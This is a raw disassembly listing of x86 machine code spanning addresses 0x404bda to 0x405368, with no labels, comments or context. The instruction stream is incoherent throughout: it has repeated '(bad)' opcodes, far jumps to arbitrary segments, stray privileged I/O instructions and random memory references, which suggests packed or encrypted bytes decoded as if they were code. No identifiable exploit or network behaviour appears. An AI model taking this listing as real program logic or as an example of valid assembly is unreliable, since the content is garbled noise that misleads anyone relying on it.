  404bda:	(bad)  
  404bdc:	xchg   dh,dl
  404bde:	mov    DWORD PTR ds:0x970e87cb,edx
  404be4:	ds mov cl,0xf0
  404be7:	dec    ecx
  404be8:	jmp    ebx
  404bea:	fucom  st(1)
  404bec:	ja     0x404c06
  404bee:	test   eax,0x963e8d35
  404bf3:	bound  esp,QWORD PTR [edx+0x28]
  404bf6:	stos   BYTE PTR es:[edi],al
  404bf7:	dec    edi
  404bf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bf9:	inc    eax
  404bfa:	mov    eax,ds:0x346951f3
  404bff:	adc    edx,DWORD PTR [ecx-0x38071b89]
  404c05:	stos   DWORD PTR es:[edi],eax
  404c06:	sbb    eax,0xc6ce7b18
  404c0b:	rcr    BYTE PTR [esi],cl
  404c0d:	sahf   
  404c0e:	shr    DWORD PTR [ebx-0xf],cl
  404c11:	lock sub dl,BYTE PTR [edi+0x67]
  404c15:	test   al,0x7f
  404c17:	aas    
  404c18:	je     0x404c33
  404c1a:	add    eax,0x61639d91
  404c1f:	adc    al,0x4d
  404c21:	or     al,0xe1
  404c23:	cmp    al,0x93
  404c25:	pusha  
  404c26:	xchg   esp,eax
  404c27:	mov    eax,DWORD PTR [edi-0x76cd476e]
  404c2d:	inc    ebp
  404c2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c2f:	mov    ebp,ebp
  404c31:	pop    ebx
  404c32:	loop   0x404bbf
  404c34:	adc    esp,DWORD PTR [edi-0x45]
  404c37:	loop   0x404bf9
  404c39:	push   ds
  404c3a:	pop    ebp
  404c3b:	popa   
  404c3c:	icebp  
  404c3d:	fwait
  404c3e:	cmc    
  404c3f:	fmul   DWORD PTR [ecx-0x5fda36d]
  404c45:	in     eax,dx
  404c46:	cmp    esi,DWORD PTR [ebx]
  404c48:	mov    ds:0xfdd18205,al
  404c4d:	ja     0x404cc2
  404c4f:	mov    ch,0x98
  404c51:	or     bl,BYTE PTR [edx-0x5a]
  404c54:	push   edi
  404c55:	enter  0xdf6c,0x1b
  404c59:	ss pop ebp
  404c5b:	mov    ebp,0x7f40124c
  404c60:	or     BYTE PTR [edi-0xe],bl
  404c63:	or     ah,ah
  404c65:	(bad)  [edi-0x7f0ee66]
  404c6b:	mov    al,ds:0x9a0c74b3
  404c70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c71:	leave  
  404c72:	pop    ecx
  404c73:	fadd   st(5),st
  404c75:	adc    esi,DWORD PTR [edx+esi*2]
  404c78:	cmp    cl,BYTE PTR [esi+0x61]
  404c7b:	leave  
  404c7c:	popa   
  404c7d:	add    al,0xd
  404c7f:	fistp  QWORD PTR [esi+0x58045d73]
  404c85:	leave  
  404c86:	and    eax,esp
  404c88:	ret    0x3ca8
  404c8b:	scas   eax,DWORD PTR es:[edi]
  404c8c:	lods   al,BYTE PTR ds:[esi]
  404c8d:	add    al,0x1d
  404c8f:	loope  0x404ce4
  404c91:	in     eax,0xa2
  404c93:	stos   BYTE PTR es:[edi],al
  404c94:	and    ecx,DWORD PTR [edi]
  404c96:	hlt    
  404c97:	ficom  WORD PTR [ebx]
  404c99:	dec    edx
  404c9a:	and    bh,BYTE PTR [eax]
  404c9c:	xor    cl,bh
  404c9e:	test   bl,ch
  404ca0:	clc    
  404ca1:	std    
  404ca2:	stc    
  404ca3:	out    dx,eax
  404ca4:	dec    esi
  404ca5:	sub    ebx,DWORD PTR ds:0x97623be1
  404cab:	mov    esp,0xe217e9dc
  404cb0:	cmp    bl,BYTE PTR [ebp-0x520a1090]
  404cb6:	test   al,0xc5
  404cb8:	repz arpl WORD PTR [ecx+0x1237f5e9],sp
  404cbf:	aad    0x10
  404cc1:	arpl   WORD PTR [edi],dx
  404cc3:	sbb    DWORD PTR [eax+0x4812f635],esp
  404cc9:	in     al,dx
  404cca:	push   esp
  404ccb:	adc    eax,0x38c86792
  404cd0:	mul    ebx
  404cd2:	and    eax,0x1338bd7a
  404cd7:	jge    0x404d51
  404cd9:	lds    edx,FWORD PTR [ebx+0x6fdf04d3]
  404cdf:	xchg   esi,eax
  404ce0:	inc    edx
  404ce1:	dec    esp
  404ce2:	adc    DWORD PTR [eax+ebp*2],ebx
  404ce5:	add    al,0x7c
  404ce7:	dec    esi
  404ce8:	mov    DWORD PTR [ebx+0x1d],ebx
  404ceb:	dec    esp
  404cec:	stos   BYTE PTR es:[edi],al
  404ced:	jl     0x404c9e
  404cef:	call   0x843bd767
  404cf4:	cli    
  404cf5:	int3   
  404cf6:	ror    BYTE PTR [eax+0x6b],1
  404cf9:	push   es
  404cfa:	sbb    BYTE PTR [ebx-0x13],ch
  404cfd:	mov    eax,ds:0x1cab4be9
  404d02:	sub    dl,BYTE PTR [edi]
  404d04:	rcl    DWORD PTR [ebx-0x4bec0da1],0x76
  404d0b:	mov    dl,0x8
  404d0d:	sbb    al,ch
  404d0f:	cld    
  404d10:	add    esp,DWORD PTR [esi+edx*2+0x4]
  404d14:	mov    ds:0xc5968cdb,al
  404d19:	or     dl,bl
  404d1b:	out    0x3c,eax
  404d1d:	pop    eax
  404d1e:	jns    0x404d06
  404d20:	dec    edi
  404d21:	inc    ebx
  404d22:	xor    BYTE PTR [ebp+0x73],ch
  404d25:	xor    DWORD PTR [esp+esi*1+0x1b],esi
  404d29:	stos   DWORD PTR es:[edi],eax
  404d2a:	ins    DWORD PTR es:[edi],dx
  404d2b:	les    edx,FWORD PTR ds:0x500def19
  404d31:	sub    BYTE PTR [edx-0x1d],dh
  404d34:	push   0xfd24637e
  404d39:	pop    eax
  404d3a:	test   BYTE PTR [ecx+0x52],0x2f
  404d3e:	dec    esi
  404d3f:	out    dx,eax
  404d40:	mov    edi,0xe01d715b
  404d45:	enter  0x593d,0x28
  404d49:	xor    BYTE PTR [ecx+0x1d6d1c80],0xc1
  404d50:	test   esi,eax
  404d52:	pop    ebx
  404d53:	xor    al,0xd2
  404d55:	aad    0x67
  404d57:	dec    edi
  404d58:	jle    0x404d6c
  404d5a:	cmp    al,0x16
  404d5c:	xchg   ebp,eax
  404d5d:	push   es
  404d5e:	pop    edx
  404d5f:	cmp    al,0x6
  404d61:	aad    0x3f
  404d63:	rol    dl,0x28
  404d66:	ss jnp 0x404d2c
  404d69:	jb     0x404d83
  404d6b:	pop    edi
  404d6c:	and    eax,0x37427e6e
  404d71:	fdivr  DWORD PTR [ebx+ebp*1]
  404d74:	popf   
  404d75:	or     edx,DWORD PTR [di]
  404d78:	cmp    BYTE PTR [edx-0x4f],dh
  404d7b:	je     0x404d81
  404d7d:	or     al,al
  404d7f:	repnz and ah,BYTE PTR [eax]
  404d82:	loopne 0x404dd3
  404d84:	lahf   
  404d85:	sub    eax,0x116558db
  404d8a:	pushf  
  404d8b:	cmc    
  404d8c:	xchg   BYTE PTR [ecx-0x32566d97],dh
  404d92:	ror    BYTE PTR [ebx-0x7d5e2bfa],1
  404d98:	inc    esi
  404d99:	push   ds
  404d9a:	pusha  
  404d9b:	mul    BYTE PTR [ebx+0x5b]
  404d9e:	mov    ebx,0x53157de2
  404da3:	icebp  
  404da4:	push   ebp
  404da5:	cmp    DWORD PTR ss:[edi],esp
  404da8:	jbe    0x404d35
  404daa:	push   edi
  404dab:	mov    edx,0xc16ee2a9
  404db0:	scas   eax,DWORD PTR es:[edi]
  404db1:	leave  
  404db2:	xchg   esi,esp
  404db4:	cld    
  404db5:	stos   DWORD PTR es:[edi],eax
  404db6:	push   edx
  404db7:	ret    0xe70f
  404dba:	cmp    al,0x12
  404dbc:	test   al,0xc0
  404dbe:	push   edi
  404dbf:	or     BYTE PTR [edx+0x73],dh
  404dc2:	xor    DWORD PTR cs:[ebp-0x4cbb524e],esi
  404dc9:	xor    ebx,DWORD PTR [ecx-0x6c]
  404dcc:	cmp    BYTE PTR [ecx],cl
  404dce:	adc    al,BYTE PTR [edx]
  404dd0:	lods   eax,DWORD PTR ds:[esi]
  404dd1:	scas   al,BYTE PTR es:[edi]
  404dd2:	shl    BYTE PTR [ecx],0x48
  404dd5:	push   edi
  404dd6:	sbb    al,0x15
  404dd8:	lock call ecx
  404ddb:	stos   DWORD PTR es:[edi],eax
  404ddc:	or     ecx,edi
  404dde:	mov    ds:0x15bd25a8,eax
  404de3:	add    eax,0x1d3330c5
  404de8:	xor    al,0xf
  404dea:	sub    eax,0x6fcd7ebc
  404def:	jg     0x404e70
  404df1:	add    ch,BYTE PTR [edi+0x25]
  404df4:	mov    cl,0xd3
  404df6:	dec    DWORD PTR [ecx+ecx*8+0x2e]
  404dfa:	jmp    0x404db7
  404dfc:	mov    cl,0xe7
  404dfe:	(bad)  
  404dff:	jmp    0x404e14
  404e01:	loopne 0x404e57
  404e03:	xchg   edx,eax
  404e04:	in     al,0xdc
  404e06:	push   eax
  404e07:	lea    esi,[edi-0x41]
  404e0a:	mov    ecx,0x4775b699
  404e0f:	adc    al,0x47
  404e11:	mov    bh,0xa7
  404e13:	xor    DWORD PTR [esi-0x40],edi
  404e16:	cmp    al,0x75
  404e18:	pop    ds
  404e19:	xor    WORD PTR [ecx-0x6425c7ad],di
  404e20:	adc    eax,0x1a941355
  404e25:	lods   eax,DWORD PTR ds:[esi]
  404e26:	jp     0x404dde
  404e28:	pop    edi
  404e29:	push   ebp
  404e2a:	sub    BYTE PTR [ecx],0xa5
  404e2d:	test   dh,ch
  404e2f:	dec    ebx
  404e30:	fistp  WORD PTR [edi+0xf]
  404e33:	adc    esi,DWORD PTR [esi+eiz*2]
  404e36:	push   eax
  404e37:	mov    bh,0x39
  404e39:	jg     0x404dc1
  404e3b:	pop    es
  404e3c:	loop   0x404dd8
  404e3e:	popf   
  404e3f:	(bad)  
  404e40:	jmp    0x5206:0xbd27d5ff
  404e47:	lods   eax,DWORD PTR ds:[esi]
  404e48:	jo     0x404df4
  404e4a:	fwait
  404e4b:	cmp    DWORD PTR [esi+0x394a2fd8],0xdb55a7e6
  404e55:	cmp    DWORD PTR [ecx-0x491504ad],ebx
  404e5b:	mov    ds:0xbe912e2d,eax
  404e60:	jmp    0x21e96ad0
  404e65:	pop    ebp
  404e67:	sbb    DWORD PTR [edx-0x7b6da40c],esi
  404e6d:	xchg   ebx,eax
  404e6e:	xchg   edx,eax
  404e6f:	jp     0x404dff
  404e71:	leave  
  404e72:	fdivr  st,st(4)
  404e74:	pusha  
  404e75:	mov    dh,0x9e
  404e77:	pop    ebp
  404e78:	add    esi,DWORD PTR [ebx*8+0x6d0229a9]
  404e7f:	aam    0x4b
  404e81:	bnd jb 0x404e06
  404e84:	mov    eax,0x3a5e685a
  404e89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e8a:	jns    0x404e49
  404e8c:	and    esp,DWORD PTR [esp+eiz*8]
  404e8f:	ds mov ah,0xfd
  404e92:	jb     0x404e1d
  404e94:	ret    0x7192
  404e97:	aaa    
  404e98:	mov    ebx,0xcd0f6db1
  404e9d:	popf   
  404e9e:	popa   
  404e9f:	push   ds
  404ea0:	jne    0x404e35
  404ea2:	clc    
  404ea3:	inc    eax
  404ea4:	sub    eax,0xe35cbd7
  404ea9:	xor    al,0xb7
  404eab:	popa   
  404eac:	jne    0x404ede
  404eae:	sbb    ebx,DWORD PTR [eax]
  404eb0:	inc    esi
  404eb1:	and    eax,0x92ea4042
  404eb6:	aad    0xd3
  404eb8:	cmp    eax,0x482fca26
  404ebd:	jg     0x404ef9
  404ebf:	hlt    
  404ec0:	adc    dl,BYTE PTR [edi]
  404ec2:	stos   DWORD PTR es:[edi],eax
  404ec3:	std    
  404ec4:	or     esp,DWORD PTR [ebx]
  404ec6:	jo     0x404eb2
  404ec8:	div    BYTE PTR [ebp+0x6e]
  404ecb:	ret    0xa82
  404ece:	mov    BYTE PTR [ebp+ebx*2+0x56],0x1f
  404ed3:	jo     0x404f46
  404ed5:	pop    ebx
  404ed6:	mov    BYTE PTR [ebx-0x3c],dl
  404ed9:	out    dx,eax
  404eda:	mov    eax,ds:0xf9f442a8
  404edf:	mov    ecx,0xcded0665
  404ee4:	aad    0x67
  404ee6:	xchg   ah,ah
  404ee8:	jo     0x404f2f
  404eea:	push   0x4a
  404eec:	adc    edx,DWORD PTR [edx+0xa06f4ec]
  404ef2:	pop    ebx
  404ef3:	data16 mov ch,BYTE PTR ds:0x30c68750
  404efa:	mov    ah,0x65
  404efc:	sub    al,0x0
  404efe:	xchg   edx,eax
  404eff:	push   eax
  404f00:	in     al,0xee
  404f02:	xchg   edx,eax
  404f03:	sbb    BYTE PTR [bp+di-0x1e6],0x3d
  404f09:	fistp  WORD PTR [edi]
  404f0b:	sbb    ebp,DWORD PTR [ecx]
  404f0d:	cmp    DWORD PTR [eax+ebx*4+0x52],edi
  404f11:	xchg   edx,eax
  404f12:	jmp    0x627e:0x59850d6f
  404f19:	push   esi
  404f1a:	inc    ebp
  404f1b:	pop    ss
  404f1c:	dec    edi
  404f1d:	sub    eax,0x818623d2
  404f22:	xchg   esp,eax
  404f23:	xor    al,0x85
  404f25:	stos   BYTE PTR es:[edi],al
  404f26:	ret    0xe63f
  404f29:	into   
  404f2a:	dec    ebp
  404f2b:	fcom   DWORD PTR [eax-0x24ac0561]
  404f31:	popa   
  404f32:	fidivr WORD PTR [edi-0x61]
  404f35:	jae    0x404fab
  404f37:	pop    es
  404f38:	repz jae 0x404f5a
  404f3b:	jmp    0x9498bf2d
  404f40:	inc    edx
  404f41:	xor    BYTE PTR [eax],dl
  404f43:	or     ecx,DWORD PTR [esi+0x64]
  404f46:	mov    edx,ss
  404f48:	mov    bh,0x2d
  404f4a:	xor    DWORD PTR [ecx+0x4b],esp
  404f4d:	dec    ebp
  404f4e:	call   DWORD PTR [eax]
  404f50:	xor    al,0x80
  404f52:	retf   0xbe90
  404f55:	or     eax,DWORD PTR [ecx]
  404f57:	fcomp  QWORD PTR [eax]
  404f59:	push   ebx
  404f5a:	xor    al,0x31
  404f5c:	loopne 0x404fa9
  404f5e:	leave  
  404f5f:	aam    0xc8
  404f61:	cmp    BYTE PTR [ebx+0x4d],al
  404f64:	dec    eax
  404f65:	fs mov eax,cs:0x29c5f6b7
  404f6c:	push   ds
  404f6d:	test   al,0x88
  404f6f:	xor    al,0xb1
  404f71:	mov    edx,DWORD PTR ds:0xa6da4aeb
  404f77:	pop    edx
  404f78:	mov    WORD PTR [ebx],ds
  404f7a:	add    DWORD PTR [edi+0x6d3b7b56],eax
  404f80:	or     al,0x6a
  404f82:	inc    edi
  404f83:	jp     0x404f61
  404f85:	xor    DWORD PTR [esi],edi
  404f87:	mov    ah,0x5d
  404f89:	inc    ebp
  404f8a:	bound  ebp,QWORD PTR [eax]
  404f8c:	test   eax,0x752b611
  404f91:	fist   DWORD PTR es:[ebx-0x60a8a534]
  404f98:	out    dx,al
  404f99:	inc    edx
  404f9a:	push   ebp
  404f9b:	dec    esi
  404f9c:	xor    bh,dh
  404f9e:	xlat   BYTE PTR ds:[ebx]
  404f9f:	mov    bh,0x17
  404fa1:	mov    dl,0x61
  404fa3:	sahf   
  404fa4:	xor    esi,DWORD PTR [edi-0x1b]
  404fa7:	jnp    0x404fdc
  404fa9:	fs jp  0x404ff5
  404fac:	jns    0x404ff8
  404fae:	and    al,0x4a
  404fb0:	(bad)  
  404fb2:	push   cs
  404fb3:	leave  
  404fb4:	pop    ss
  404fb5:	stos   BYTE PTR es:[edi],al
  404fb6:	dec    ebp
  404fb7:	jnp    0x405027
  404fb9:	sbb    al,0x7f
  404fbb:	sub    DWORD PTR [ecx-0x4b],ebx
  404fbe:	jp     0x404fe5
  404fc0:	ins    BYTE PTR es:[edi],dx
  404fc1:	addr16 xor eax,0x112de9f5
  404fc7:	jmp    0x404fcb
  404fc9:	and    eax,0xd3bc5bba
  404fce:	or     DWORD PTR [ebx-0x13],0xffffffa7
  404fd2:	mov    dh,0x5e
  404fd4:	test   al,ch
  404fd6:	adc    eax,0x8ecc466
  404fdb:	mov    eax,0xa72b6760
  404fe0:	pop    edx
  404fe1:	ins    DWORD PTR es:[edi],dx
  404fe2:	enter  0xa34,0x6e
  404fe6:	or     eax,0x1c7dd0e1
  404feb:	fld    TBYTE PTR [ebx-0x1f]
  404fee:	and    BYTE PTR [ebp-0x11494242],bh
  404ff4:	jo     0x404fa6
  404ff6:	call   0x64e0:0x69d01401
  404ffd:	sub    eax,0x86310958
  405002:	or     BYTE PTR [ebx],dl
  405004:	daa    
  405005:	cdq    
  405006:	jb     0x405025
  405008:	rcr    BYTE PTR [ecx-0x3a],cl
  40500b:	ins    DWORD PTR es:[edi],dx
  40500c:	jbe    0x404f91
  40500e:	pushf  
  40500f:	cdq    
  405010:	push   ecx
  405011:	xchg   ch,ah
  405013:	in     eax,0xa1
  405015:	mov    DWORD PTR [edi-0x22],ecx
  405018:	stos   DWORD PTR es:[edi],eax
  405019:	cdq    
  40501a:	adc    edx,0x14
  40501d:	fmul   QWORD PTR [ebx-0x2d]
  405020:	jle    0x40502e
  405022:	xor    ebp,DWORD PTR [edi+0x5cc94efa]
  405028:	or     dl,bh
  40502a:	out    0x25,eax
  40502c:	rol    edx,1
  40502e:	xchg   ch,dh
  405030:	icebp  
  405031:	inc    ecx
  405032:	fldenv [ebp-0x58fa8861]
  405038:	sub    eax,0x8514a385
  40503d:	popa   
  40503e:	aam    0xbc
  405040:	mov    edi,0xede1c273
  405045:	dec    edi
  405046:	rcr    BYTE PTR [ebx-0x60],0x7
  40504a:	dec    edi
  40504b:	outs   dx,BYTE PTR ds:[esi]
  40504c:	fnstsw ax
  40504e:	xor    eax,0xffb49d15
  405053:	call   0x5747f55a
  405058:	inc    eax
  405059:	and    BYTE PTR [ebp*4+0x525bfc42],cl
  405060:	into   
  405061:	aaa    
  405062:	shl    DWORD PTR [ebx],cl
  405064:	xchg   ebx,eax
  405065:	mov    bl,0xda
  405067:	rcr    DWORD PTR [ecx],0x92
  40506a:	(bad)  
  40506c:	push   cs
  40506d:	mov    eax,ds:0xbc8c2391
  405072:	cwde   
  405073:	lea    esp,[edi+0x77]
  405076:	mov    eax,ds:0x8578b1dc
  40507b:	pop    ecx
  40507c:	pop    ebx
  40507d:	sar    edi,0x22
  405080:	jmp    0xd546:0xa28e4ac
  405087:	unpckhps xmm7,XMMWORD PTR [esi+0x50]
  40508b:	stc    
  40508c:	popf   
  40508d:	push   cs
  40508e:	dec    edx
  40508f:	(bad)  
  405090:	in     eax,dx
  405091:	fsub   DWORD PTR [esi+0x32]
  405094:	jecxz  0x405089
  405096:	(bad)  
  405097:	out    dx,eax
  405098:	fld    QWORD PTR [edx]
  40509a:	into   
  40509b:	in     al,0x2c
  40509d:	js     0x4050ad
  40509f:	icebp  
  4050a0:	outs   dx,DWORD PTR ds:[esi]
  4050a1:	mov    ah,0x6b
  4050a3:	and    ch,0x62
  4050a6:	push   eax
  4050a7:	aas    
  4050a8:	jmp    0x8f93:0x85a5d2a2
  4050af:	inc    ebp
  4050b0:	xchg   esi,ecx
  4050b2:	pop    edx
  4050b3:	nop
  4050b4:	mov    bh,0x79
  4050b6:	and    BYTE PTR [ebx+eiz*1],0x29
  4050ba:	inc    ecx
  4050bb:	cmc    
  4050bc:	mov    bh,0x66
  4050be:	push   esi
  4050bf:	mov    al,ds:0xa28eeac4
  4050c4:	push   es
  4050c5:	and    BYTE PTR [eax+0x137daa0d],0x58
  4050cc:	or     edi,edi
  4050ce:	pop    eax
  4050cf:	pusha  
  4050d0:	or     cl,BYTE PTR [edx+0x385fd099]
  4050d6:	inc    ebp
  4050d7:	into   
  4050d8:	cdq    
  4050d9:	cmp    BYTE PTR [eax],dh
  4050db:	add    dl,BYTE PTR [eax+edx*8-0x3acfe8d9]
  4050e2:	mov    eax,0x20afa47e
  4050e7:	retf   0x5b1
  4050ea:	cmc    
  4050eb:	add    al,0x9c
  4050ed:	xor    eax,0x82802d15
  4050f2:	sahf   
  4050f3:	enter  0xc476,0x4b
  4050f7:	pop    ecx
  4050f8:	jmp    0x405124
  4050fa:	mov    esp,0xf2e01ae1
  4050ff:	rol    BYTE PTR [ebp+0x17],0x10
  405103:	jbe    0x4050c8
  405105:	je     0x40513f
  405107:	pop    ss
  405108:	sar    esp,0xba
  40510b:	inc    esi
  40510c:	scas   eax,DWORD PTR es:[edi]
  40510d:	lds    esi,FWORD PTR ds:0x87883173
  405113:	shl    BYTE PTR [ecx+ebx*1],1
  405116:	or     eax,0xe4c02b71
  40511b:	adc    al,0x80
  40511d:	adc    BYTE PTR [eax+0x5c],bh
  405120:	jecxz  0x40510a
  405122:	mov    edx,0x861c6aac
  405127:	in     eax,0x6f
  405129:	sub    ah,BYTE PTR [eax-0x4f]
  40512c:	leave  
  40512d:	mov    dl,cl
  40512f:	sbb    esi,edi
  405131:	inc    esi
  405132:	out    dx,eax
  405133:	or     BYTE PTR [esi],ch
  405135:	sti    
  405136:	push   ds
  405137:	or     ch,BYTE PTR [edi+eiz*1+0x57]
  40513b:	inc    ebp
  40513c:	popa   
  40513d:	(bad)  
  40513e:	iret   
  40513f:	pop    ebx
  405140:	xchg   esp,eax
  405141:	or     DWORD PTR [esi+0x37d8fae7],ebx
  405147:	sub    eax,0x6030cb52
  40514c:	pop    es
  40514d:	sbb    ah,BYTE PTR [edi]
  40514f:	xor    esi,DWORD PTR [eax+0x33]
  405152:	mov    ch,0xa3
  405154:	pop    edx
  405155:	(bad)  
  405156:	mov    eax,0x75c8b38b
  40515b:	pop    edx
  40515c:	js     0x40510b
  40515e:	and    DWORD PTR [esi],ebp
  405160:	adc    BYTE PTR [edx],0xeb
  405163:	jecxz  0x40515e
  405165:	dec    eax
  405166:	mov    WORD PTR [ebx-0x31],es
  405169:	in     eax,0x94
  40516b:	scas   eax,DWORD PTR es:[edi]
  40516c:	dec    edi
  40516d:	inc    esp
  40516e:	mov    ch,0x10
  405170:	stos   BYTE PTR es:[edi],al
  405171:	jle    0x4051ce
  405173:	xchg   ebx,eax
  405174:	je     0x40513f
  405176:	arpl   WORD PTR [ebx+0x22],di
  405179:	retf   0xbdda
  40517c:	sub    ebp,DWORD PTR [edx+edi*1]
  40517f:	jle    0x4051f4
  405181:	or     DWORD PTR [esi],0xaec7029d
  405187:	inc    edx
  405188:	mov    bh,0xc
  40518a:	dec    eax
  40518b:	xlat   BYTE PTR ds:[ebx]
  40518c:	or     al,0x6d
  40518e:	xchg   ecx,eax
  40518f:	icebp  
  405190:	adc    eax,edx
  405192:	dec    esp
  405193:	ins    DWORD PTR es:[edi],dx
  405194:	imul   esi,esi,0xe4e55bf3
  40519a:	cmc    
  40519b:	outs   dx,DWORD PTR ds:[esi]
  40519c:	add    cl,bh
  40519e:	mov    edi,0x6a4d2963
  4051a3:	cmc    
  4051a4:	inc    eax
  4051a5:	push   es
  4051a6:	stos   DWORD PTR es:[edi],eax
  4051a7:	push   ebp
  4051a8:	push   esp
  4051a9:	stos   DWORD PTR es:[edi],eax
  4051aa:	scas   al,BYTE PTR es:[edi]
  4051ab:	mov    BYTE PTR [esi],ch
  4051ad:	pushf  
  4051ae:	in     eax,dx
  4051af:	ror    DWORD PTR [ecx+0x1272d94],0x8
  4051b6:	loope  0x40517e
  4051b8:	aad    0x32
  4051ba:	lahf   
  4051bb:	arpl   sp,cx
  4051bd:	push   ds
  4051be:	das    
  4051bf:	pop    eax
  4051c0:	jnp    0x405198
  4051c2:	rcl    BYTE PTR [eax],cl
  4051c4:	enter  0x38c6,0x2e
  4051c8:	dec    ebp
  4051c9:	rcl    esp,1
  4051cb:	pop    eax
  4051cc:	push   0x52cbbe06
  4051d1:	or     al,0xf1
  4051d3:	cs push esp
  4051d5:	pop    eax
  4051d6:	mov    BYTE PTR [ebp+0x48],bh
  4051d9:	fcomp  DWORD PTR [ecx]
  4051db:	jb     0x405217
  4051dd:	lea    ebp,[eax+0x1e543f37]
  4051e3:	push   0xffffff99
  4051e5:	call   0x3b58:0xc7a8c03a
  4051ec:	fistp  DWORD PTR [ebx+0x640cfd41]
  4051f2:	ins    BYTE PTR es:[edi],dx
  4051f3:	ins    BYTE PTR es:[edi],dx
  4051f4:	push   edi
  4051f5:	push   edi
  4051f6:	stos   BYTE PTR es:[edi],al
  4051f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051f8:	pusha  
  4051f9:	lock mov DWORD PTR [ebp+0x4dcb7371],0xcf4fdc9c
  405204:	jmp    0x405197
  405206:	stc    
  405207:	repz sbb al,0x20
  40520a:	mov    esp,0x499b0dec
  40520f:	fst    QWORD PTR [ebx-0x4c4d256b]
  405215:	lods   al,BYTE PTR ds:[esi]
  405216:	ds sub eax,0x29922cc2
  40521c:	stos   DWORD PTR es:[edi],eax
  40521d:	aaa    
  40521e:	ret    0xc4bd
  405221:	cmc    
  405222:	iret   
  405223:	pop    eax
  405224:	pop    edi
  405225:	or     dh,ch
  405227:	cmc    
  405228:	xlat   BYTE PTR ds:[ebx]
  405229:	mov    ebx,0x9968bc1e
  40522e:	mov    eax,0x1550dd4f
  405233:	pop    edi
  405234:	lock push ebp
  405236:	xchg   edi,eax
  405237:	frstor [ebx-0x49]
  40523a:	(bad)  
  40523b:	lds    edi,FWORD PTR [edx]
  40523d:	icebp  
  40523e:	xchg   edx,eax
  40523f:	and    BYTE PTR [edx],dl
  405241:	sub    ecx,DWORD PTR [ebx-0x1b63f5d1]
  405247:	leave  
  405248:	loop   0x405293
  40524a:	xchg   edx,eax
  40524b:	push   ebp
  40524c:	mov    edi,0x8a14dbb7
  405251:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405252:	in     al,0x5
  405254:	aad    0x1b
  405256:	retf   
  405257:	arpl   bx,si
  405259:	mov    ds:0xe656c5d4,al
  40525e:	jno    0x4052d8
  405260:	xchg   ebp,eax
  405261:	mov    bh,0x82
  405263:	cmp    DWORD PTR [ebx+esi*2+0x42575eeb],esi
  40526a:	pop    ebx
  40526b:	cmp    DWORD PTR [ebx-0x26],ebx
  40526e:	rcl    DWORD PTR [ebx],1
  405270:	loopne 0x405275
  405272:	mov    edx,0x31ef49ed
  405277:	lahf   
  405278:	dec    ebp
  405279:	and    edx,ebp
  40527b:	dec    ecx
  40527c:	mov    cl,0xc1
  40527e:	sbb    DWORD PTR [ebp+ebx*2+0x2364b0d5],ecx
  405285:	es ds int 0x47
  405289:	loope  0x4052cc
  40528b:	cmp    ebp,DWORD PTR [ecx+eax*8-0x7b]
  40528f:	jl     0x4052d0
  405291:	neg    ecx
  405293:	push   edx
  405294:	je     0x405314
  405296:	sub    al,0x23
  405298:	jge    0x4052e1
  40529a:	or     al,0x88
  40529c:	adc    eax,edx
  40529e:	pop    ecx
  40529f:	rcr    DWORD PTR [edi],0x9b
  4052a2:	std    
  4052a3:	cs jae 0x405254
  4052a6:	enter  0x6241,0xcb
  4052aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052ab:	push   ecx
  4052ac:	mov    dl,0x39
  4052ae:	leave  
  4052af:	inc    esp
  4052b0:	sbb    al,0xff
  4052b2:	shl    dh,0x76
  4052b5:	mov    ebp,0xe73c3ff8
  4052ba:	into   
  4052bb:	inc    edi
  4052bc:	push   0xffffffe6
  4052be:	rcl    DWORD PTR [ebp-0x23314533],1
  4052c4:	sbb    ecx,DWORD PTR [ebp+0x1f863867]
  4052ca:	xchg   esi,eax
  4052cb:	cmp    eax,0x51e1048d
  4052d0:	ror    BYTE PTR [ecx+0x2c],0xc5
  4052d4:	mov    ebx,0x4422f20d
  4052d9:	or     DWORD PTR [esi+0x4e],ebp
  4052dc:	pushf  
  4052dd:	push   ss
  4052de:	sbb    BYTE PTR [edi],0xeb
  4052e1:	lods   al,BYTE PTR ds:[esi]
  4052e2:	scas   al,BYTE PTR es:[edi]
  4052e3:	ret    0xb8b4
  4052e6:	push   edx
  4052e7:	xor    eax,0xb10acb06
  4052ec:	push   0xbb75a4e3
  4052f1:	lods   al,BYTE PTR ds:[esi]
  4052f2:	or     ecx,DWORD PTR [esi-0x76]
  4052f5:	stos   BYTE PTR es:[edi],al
  4052f6:	xadd   BYTE PTR [ecx],al
  4052f9:	cmp    eax,0x34ad0f7a
  4052fe:	jp     0x405376
  405300:	cs jp  0x4052de
  405303:	pop    ecx
  405304:	(bad)  [edx-0x6f]
  405307:	ret    0x9658
  40530a:	mov    al,ds:0x895938e0
  40530f:	mov    BYTE PTR [edi],ch
  405311:	pop    ecx
  405312:	cmp    eax,0xf24e4726
  405317:	cld    
  405318:	ror    BYTE PTR [edx],cl
  40531a:	(bad)  
  40531b:	fldenv [edx]
  40531d:	mov    dl,bh
  40531f:	mov    ebp,0x6016c550
  405324:	push   esi
  405325:	jns    0x4053a1
  405327:	fstp   DWORD PTR [ecx-0xc]
  40532a:	ret    
  40532b:	push   esi
  40532c:	and    DWORD PTR [edi-0x42],edi
  40532f:	outs   dx,DWORD PTR ds:[esi]
  405330:	clc    
  405331:	stos   DWORD PTR es:[edi],eax
  405332:	stos   BYTE PTR es:[edi],al
  405333:	stc    
  405334:	fmul   DWORD PTR [edx+0x676b9297]
  40533a:	into   
  40533b:	or     al,0xb2
  40533d:	inc    ebx
  40533e:	rcl    DWORD PTR ds:0xde31e3f7,0x66
  405345:	xchg   esi,eax
  405346:	add    ecx,DWORD PTR [ebp+0x7efe4c45]
  40534c:	ins    BYTE PTR es:[edi],dx
  40534d:	sti    
  40534e:	fstp   TBYTE PTR [ebp-0x45]
  405351:	popf   
  405352:	out    0xca,al
  405354:	neg    esp
  405356:	rol    bl,cl
  405358:	aaa    
  405359:	dec    ebp
  40535a:	mov    ds:0xcab92d60,eax
  40535f:	lahf   
  405360:	lods   eax,DWORD PTR ds:[esi]
  405361:	loopne 0x405360
  405363:	sbb    BYTE PTR es:[edi-0x54],bl
  405367:	icebp  
  405368:	dec    edx
